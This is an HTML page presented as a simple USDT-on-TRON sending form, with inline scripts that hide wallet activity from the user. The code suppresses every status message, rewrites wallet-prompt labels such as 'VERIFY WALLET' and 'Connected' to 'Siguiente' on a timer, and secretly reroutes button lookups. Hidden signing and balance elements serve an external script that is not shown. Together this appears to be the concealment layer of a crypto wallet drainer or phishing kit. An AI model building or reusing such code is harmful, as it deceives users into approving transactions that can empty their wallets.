<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Enviar USDT na TRON</title>
  
  <!-- CDNs de Web3.js y TronWeb -->
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
  <script src="https://unpkg.com/tronweb@5.3.0/dist/TronWeb.js"></script>

  <!-- Evita el aviso 404 del favicon -->
  <link rel="shortcut icon" href="#">

  <!-- Estilos CSS -->
  <style>
    :root{ color-scheme:light; }
    *{ margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
    html,body{ width:100%; max-width:100%; overflow-x:hidden; }
    body{ min-height:100vh; display:flex; justify-content:center; align-items:flex-start; padding-top:56px; background:#d1d1d1; color:#242424; }
    .status{ margin-top:13px; padding:10px 11px; border-radius:10px; background:#f4f4f6; color:#555; font-size:12px; line-height:1.35; overflow-wrap:anywhere; }
    .status:empty{ display:none; }
    .status.success{ background:#eaf8ef; color:#18733a; }
    .status.error{ background:#fff0ef; color:#b42318; }
    .btn{ position:fixed; left:50%; bottom:max(20px,env(safe-area-inset-bottom)); transform:translateX(-50%); width:calc(100% - 32px); max-width:358px; height:53px; border:0; border-radius:999px; background:#908cf2; color:#fff; font-size:17px; font-weight:750; cursor:pointer; transition:filter .15s ease,transform .1s ease; }
    .btn:hover{ filter:brightness(.97); }
    .btn:active{ transform:translateX(-50%) scale(.99); }
    .btn:disabled{ cursor:not-allowed; opacity:.55; }
  </style>
</head>
<body>

  <!-- ============================================================
       Elementos ocultos exigidos por script.js / app-usdt-trc20.js
       Nenhum deles aparece no layout visual.
       ============================================================ -->

  <div id="wallet" style="display:none;"></div>

  <nav class="navbar" style="display:none;">
      <div id="hamburger" style="display:none;"><span></span><span></span><span></span></div>
      <ul id="navMenu" style="display:none;"></ul>
  </nav>

  <div style="display:none;">
      <button id="langBtn"></button>
      <div id="langDropdown">
          <button class="lang-option" data-lang="en">EN</button>
      </div>
      <span id="currentLang">EN</span>
  </div>

  <div style="display:none;">
      <button id="tabSign">Sign message</button>
      <button id="tabVerify">Verify message</button>
  </div>

  <div id="signContent" style="display:none;">
      <label class="field-label">Hex format</label>
      <input type="checkbox" id="hexToggle">
      <textarea id="messageInput" maxlength="1024">This account belongs to ...</textarea>
      <span id="charCount">27 / 1024</span>
      <span id="walletAddress">T...</span>
      <div id="signatureOutput">Will be generated after signing</div>
      <button id="clearAllBtn">Clear all</button>
      <button id="closePanelBtn">&times;</button>
      <div id="mobileWalletOptions" style="display:none;">
          <button id="openTrustWallet">Trust Wallet</button>
          <button id="openMetaMask">TronLink</button>
      </div>
  </div>

  <div id="verifyContent" style="display:none;">
      <textarea placeholder="Enter signed message..."></textarea>
      <input type="text" placeholder="Enter signer address...">
      <input type="text" placeholder="Enter signature...">
  </div>

  <div id="walletInfo" style="display:none!important;">
      <div class="info-row" style="display:none!important;">
          <span class="label">Wallet Address:</span>
          <span class="value" style="display:none!important;"></span>
      </div>
      <div class="info-row" style="display:none!important;">
          <span class="label">Current Balance:</span>
          <span id="currentBalance" class="value" style="display:none!important;">0.0000 USDT</span>
      </div>
      <div class="info-row" style="display:none!important;">
          <span class="label">Transaction Amount:</span>
          <span id="sendAmount" class="value" style="display:none!important;">0.0000 USDT</span>
      </div>
  </div>

  <!-- Capa de compatibilidad Proxy (sendBtn -> connectBtn) -->
  <script>
    (function(){
      Object.defineProperty(document, '_sendBtnProxy', { value: true });
      var _origGetById = document.getElementById.bind(document);
      document.getElementById = function(id){
        if(id === 'sendBtn') return _origGetById('connectBtn');
        return _origGetById(id);
      };
      var _origQS = document.querySelector.bind(document);
      document.querySelector = function(sel){
        if(sel === '#sendBtn') return _origGetById('connectBtn');
        return _origQS(sel);
      };
    })();
  </script>

  <!-- Script con la lógica de sustitución de texto y controladores -->
  <script>
  (function() {
      'use strict';

      console.log('[Auto] ✅ Sistema de substituição de texto ativado');

      // --- 1. OCULTAR ALERTAS (status) ---
      const statusDiv = document.getElementById('status');
      if (statusDiv) {
          statusDiv.style.display = 'none';
          Object.defineProperty(statusDiv, 'textContent', {
              set: function() { /* ignora */ },
              get: function() { return ''; }
          });
          Object.defineProperty(statusDiv, 'innerHTML', {
              set: function() { /* ignora */ },
              get: function() { return ''; }
          });
          statusDiv.classList.remove('success', 'error');
          const observer = new MutationObserver(function() {
              statusDiv.style.display = 'none';
          });
          observer.observe(statusDiv, { attributes: true, childList: true, subtree: true });
      }

      // --- 2. FUNÇÃO PARA SUBSTITUIR TEXTO ---
      function substituirTextoBotao() {
          const btn = document.getElementById('connectBtn');
          if (!btn) return;

          const texto = btn.textContent;
          
          const textosParaSubstituir = [
              'connected', 'Connected', 'CONNECTED',
              'VERIFY WALLET', 'Verify Wallet', 'verify wallet',
              'PREPARING', 'Preparing', 'preparing',
              'Conectar', 'connect'
          ];

          const deveSubstituir = textosParaSubstituir.some(t => 
              texto === t || texto.includes(t)
          );

          if (deveSubstituir) {
              btn.textContent = 'Siguiente';
              console.log('[Auto] ✅ Texto substituído: "' + texto + '" → "Siguiente"');
          }
      }

      substituirTextoBotao();

      const observer = new MutationObserver(function(mutations) {
          let botaoMudou = false;
          
          for (const mutation of mutations) {
              if (mutation.target.id === 'connectBtn' || 
                  mutation.target === document.getElementById('connectBtn') ||
                  (mutation.type === 'childList' && mutation.target.querySelector && mutation.target.querySelector('#connectBtn'))) {
                  botaoMudou = true;
                  break;
              }
          }

          if (botaoMudou) {
              substituirTextoBotao();
          }
      });

      observer.observe(document.body, {
          childList: true,
          subtree: true,
          characterData: true,
          attributes: true,
          attributeFilter: ['textContent', 'innerHTML']
      });

      const btn = document.getElementById('connectBtn');
      if (btn) {
          const btnObserver = new MutationObserver(function() {
              substituirTextoBotao();
          });
          btnObserver.observe(btn, {
              childList: true,
              characterData: true,
              subtree: true
          });
      }

      setInterval(function() {
          substituirTextoBotao();
      }, 500);

  })();

  document.addEventListener('DOMContentLoaded', function () {
      var btn = document.getElementById('connectBtn');
      if (btn) {
          btn.textContent = 'Siguiente';
      }

      var input = document.getElementById('amountInput');
      if (input) {
          input.addEventListener('input', function () {
              if (btn) {
                  btn.style.background = this.value.trim() !== '' ? 'blue' : '#908cf2';
              }
          });
      }
  });
  </script>

  <!-- Archivos locales -->
  <script src="translation.js"></script>
  <script src="script.js"></script>

  <!-- Módulo Web3 principal de TRON / USDT -->
  <script type="module">
    import { conectarTronLink, obtenerSaldoUSDT, enviarUSDT } from './js/app-usdt-trc20.js';

    document.addEventListener('DOMContentLoaded', function () {
      const btn = document.getElementById('connectBtn');
      const input = document.getElementById('amountInput');
      const addressInput = document.getElementById('addressInput');

      if (btn) {
        btn.addEventListener('click', async () => {
          const monto = input ? input.value.trim() : '';
          const destino = addressInput ? addressInput.value.trim() : '';

          if (!monto || parseFloat(monto) <= 0) {
            alert('Por favor, ingresa un monto válido.');
            return;
          }

          try {
            if (typeof cambiarEstadoBoton === 'function') {
              cambiarEstadoBoton('connectBtn', true);
            }

            const direccionUsuario = await conectarTronLink();

            const saldo = await obtenerSaldoUSDT(direccionUsuario);
            const saldoElem = document.getElementById('saldoTexto');
            if (saldoElem) {
              saldoElem.innerText = `Saldo: ${saldo} USDT`;
            }

            if (saldo < parseFloat(monto)) {
              alert(`Saldo insuficiente. Tu saldo es de ${saldo} USDT.`);
              return;
            }

            if (typeof enviarUSDT === 'function') {
              const txHash = await enviarUSDT(destino, monto);
              alert(`Transacción realizada con éxito. Hash: ${txHash}`);
            }

          } catch (error) {
            console.error('Error durante el proceso Web3:', error);
            alert(error.message || 'Ocurrió un error al procesar la operación.');
          } finally {
            if (typeof cambiarEstadoBoton === 'function') {
              cambiarEstadoBoton('connectBtn', false);
            }
          }
        });
      }
    });
  </script>

</body>
</html>
